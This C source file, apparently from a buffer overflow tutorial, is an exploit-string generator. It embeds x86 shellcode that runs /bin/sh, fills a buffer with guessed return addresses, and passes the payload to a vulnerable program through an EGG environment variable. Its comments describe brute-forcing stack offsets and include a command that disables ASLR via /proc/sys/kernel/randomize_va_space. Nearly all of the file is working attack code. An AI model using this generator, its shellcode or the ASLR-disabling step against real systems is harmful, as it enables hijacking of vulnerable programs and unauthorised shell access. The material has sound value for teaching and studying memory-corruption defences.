//
// generator.c
//
// Tool to craft the exploitation string.
// It accepts two parameters:
//     string_length - the total length in bytes of the string that will be later copied to
//         the stack buffer of the vulnerable program. This length must be greater than the
//         buffer size, to which strcpy function performs a copy.
//     offset_in_the_stack - the offset in bytes from the current process's stack pointer
//         a.k.a. top of the stack. This must be chosen randomly and passed to generator
//         program.
// Notes:
//  The crafted exploitation string will be sent to vulnerable program by some other means,
// for instance, manually or with a bash script. It will eventually crash the vulnerable
// process. If this happens, the exit code of the process will not be 0 == Success. So, a
// new exploitation string must be generated, containing increased by 4 bytes offset in the
// stack. This must be repeated until the exploitation will actually work. The return
// address from the function, containing overflowed buffer will point to the beginning of
// this buffer, with our shellcode in it.
// This is done with two assumptions:
//   1. stack region is always layed out by the kernel at the same address for each new
// program. And after program restart, the vulnerable buffer will be placed exactly at the
// same memory location as it was before. This is was common before ASLR was implemented.
// Nowadays, to turn it off, we need:
//       # echo "0" > /proc/sys/kernel/randomize_va_space
//   2. our generator program's top of the stack is higher in memory than the vulnerable
// program's buffer of interest. Below is the possible layout of stacks in both programs:
//


#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512

// This shellcode is taken from Steps 3 and 4 and it performs exec(/bin/sh)
char shellcode[] = {
    "\xeb\x1f\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff"
    "/bin/sh" // note the terminating zero, and use strlen() to obtain shellcode's length!
};

unsigned long get_sp() {
    __asm__("movl %esp, %eax \n\t");
}

void main(int argc, char* argv[]) {
    if (argc > 1 && !strcmp(argv[1], "-h")) {
        printf("Usage:\n      %s <string_length> <offset_in_the_stack>\n", argv[0]);
        exit(0);
    }

    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    if (argc > 1)
        bsize = atoi(argv[1]);
    if (argc > 2)
        offset = atoi(argv[2]);

    // Calculate return address candidate in vulnerable.c program
    long address = get_sp() - offset;
    printf("Trying address: 0x%08x...\n", address);

    // Prepare the buffer for shellcode + ret addresses
    char* buffer = malloc(bsize);
    if (!buffer) {
        printf("Can't allocate memory, malloc(%d)\n", bsize);
        exit(0);
    }

    // [RET.RET.RET.RET.RET.RET.RET......RET.]
    long* long_ptr = (long*)buffer;
    for (int i = 0; i < bsize / sizeof(long*); ++i)
        *(long_ptr++) = address;

    // [EGG=RET.RET.RET.RET.RET.RET......RET.]
    memcpy(buffer, "EGG=", 4);

    // [EGG=SHELLCODE...RET.RET.RET......RET.]
    memcpy(buffer+4, shellcode, sizeof(shellcode)-1);

    // [EGG=SHELLCODE...RET.RET.RET......RET0]
    buffer[bsize - 1] = '\0';

    // Note that this will work only in assumption that addresses on the stack do not
    // contain null bytes, e.g. 0xbffffdb4.
    // If the stack is located lower in memory, like in Windows, e.g. 0x00fcdda, then
    // the strcpy will stop copying on null first null byte.

    // set environment variable EGG with the value of our shellcode string
    putenv(buffer);
    system("/bin/bash");
}
